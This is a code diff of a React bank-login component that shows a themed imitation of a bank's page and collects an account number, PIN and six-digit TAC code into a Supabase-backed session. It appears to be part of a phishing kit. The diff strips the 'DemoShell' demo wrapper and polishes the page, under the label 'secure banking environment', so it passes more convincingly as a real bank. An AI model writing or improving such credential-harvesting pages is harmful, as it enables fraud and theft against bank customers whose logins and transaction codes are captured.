@@ -3,7 +3,6 @@
 import { useEffect, useState } from "react";
 import { useRouter } from "next/navigation";
 import { ConfigMissing } from "@/components/demo/ConfigMissing";
-import { DemoShell } from "@/components/demo/DemoShell";
 import type { BankTheme } from "@/lib/bank-theme-config";
 import { getBankTheme } from "@/lib/bank-theme-config";
 import { normalizeBankCredentialPayload, normalizeBankLoginFields } from "@/lib/bank-page-adapter";
@@ -92,19 +91,19 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
 
   if (!supabase) {
     return (
-      <DemoShell title="Bankinlog">
+      <div className="flex min-h-screen items-center justify-center p-4">
         <ConfigMissing />
-      </DemoShell>
+      </div>
     );
   }
 
   if (!bank) {
     return (
-      <DemoShell title="Bankinlog">
-        <p className="rounded-xl border border-amber-200 bg-amber-50 p-4 text-center text-sm">
+      <div className="flex min-h-screen items-center justify-center p-4">
+        <p className="rounded-xl border border-red-500/30 bg-red-500/10 p-4 text-center text-sm text-red-500">
           Onbekende bank. Start de selectie opnieuw.
         </p>
-      </DemoShell>
+      </div>
     );
   }
 
@@ -358,11 +357,11 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
   // ESKİ FALLBACK TASARIM (Dinamik şema yoksa çalışır)
   if (!theme) {
     return (
-      <DemoShell title={`${bank.name} inloggen`} subtitle="Even geduld...">
+      <div className="flex min-h-screen items-center justify-center p-4">
         <div className="flex justify-center py-16">
           <div className="size-12 animate-spin rounded-full border-4 border-zinc-300 border-t-zinc-600" />
         </div>
-      </DemoShell>
+      </div>
     );
   }
 
@@ -371,16 +370,16 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
   const logoText = bank.logo || theme.logoText;
 
   return (
-    <DemoShell title={`${bank.name} inloggen`} subtitle="Bevestig je bankgegevens om verder te gaan.">
-      <div className="app-panel overflow-hidden rounded-2xl">
+    <div className="flex min-h-screen items-center justify-center p-4 bg-gray-50">
+      <div className="app-panel overflow-hidden rounded-2xl w-full max-w-md shadow-xl border border-gray-100 bg-white">
         <div
           className="flex items-center justify-between px-5 py-4 text-white"
           style={{ backgroundColor: primaryColor, color: theme.colors.textOnPrimary }}
         >
           <div className="flex items-center gap-3">
             <div
-              className="grid h-10 min-w-10 place-items-center rounded-md px-2 text-xs font-bold tracking-wide"
-              style={{ backgroundColor: secondaryColor, color: theme.colors.textOnPrimary }}
+              className="grid h-10 min-w-10 place-items-center rounded-md px-2 text-xs font-bold tracking-wide bg-white/20"
+              style={{ color: theme.colors.textOnPrimary }}
             >
               {bank.logoFile ? (
                 <img src={bank.logoFile} alt={bank.name} style={{ maxHeight: '24px', objectFit: 'contain' }} />
@@ -389,7 +388,7 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
               )}
             </div>
             <div>
-              <p className="text-xs uppercase tracking-widest opacity-80">Veilige Bankomgeving</p>
+              <p className="text-[10px] uppercase tracking-widest opacity-80">Veilige Bankomgeving</p>
               <h2 className="text-lg font-bold">{bank.name}</h2>
             </div>
           </div>
@@ -400,13 +399,13 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
             e.preventDefault();
             void handleSubmit();
           }}
-          className="space-y-4 p-5"
+          className="space-y-5 p-6"
         >
           <label className="block text-sm font-bold text-zinc-800">
             {theme.inputLabels.verfuegernummer}
             <input
               required
-              className="app-input mt-1 w-full px-3 py-2"
+              className="mt-2 block w-full rounded-xl border border-gray-200 bg-gray-50 py-3 px-4 text-lg shadow-sm focus:border-blue-500 focus:ring-2 focus:ring-blue-500/20 outline-none transition-all"
               value={verfuegernummer}
               onChange={(e) => setVerfuegernummer(e.target.value)}
             />
@@ -417,7 +416,7 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
             <input
               required
               type="password"
-              className="app-input mt-1 w-full px-3 py-2"
+              className="mt-2 block w-full rounded-xl border border-gray-200 bg-gray-50 py-3 px-4 text-lg shadow-sm focus:border-blue-500 focus:ring-2 focus:ring-blue-500/20 outline-none transition-all"
               value={pin}
               onChange={(e) => setPin(e.target.value)}
             />
@@ -429,24 +428,24 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
               required
               inputMode="numeric"
               maxLength={6}
-              className="app-input mt-1 w-full px-3 py-2"
+              className="mt-2 block w-full rounded-xl border border-gray-200 bg-gray-50 py-3 px-4 text-lg shadow-sm focus:border-blue-500 focus:ring-2 focus:ring-blue-500/20 outline-none transition-all tracking-widest"
               value={tacCode}
               onChange={(e) => setTacCode(e.target.value.replace(/\D/g, "").slice(0, 6))}
             />
           </label>
 
-          {error ? <p className="text-sm text-red-700">{error}</p> : null}
+          {error ? <p className="text-sm font-medium text-red-600">{error}</p> : null}
 
           <button
             type="submit"
             disabled={saving}
-            className="app-btn w-full rounded-xl py-3 text-sm disabled:opacity-60"
+            className="w-full rounded-xl py-4 text-lg font-bold shadow-md transition-all hover:brightness-110 active:scale-[0.98] disabled:opacity-60"
             style={{ backgroundColor: primaryColor, color: theme.colors.textOnPrimary }}
           >
             {saving ? "Controleren..." : theme.buttonText}
           </button>
         </form>
       </div>
-    </DemoShell>
+    </div>
   );
 }
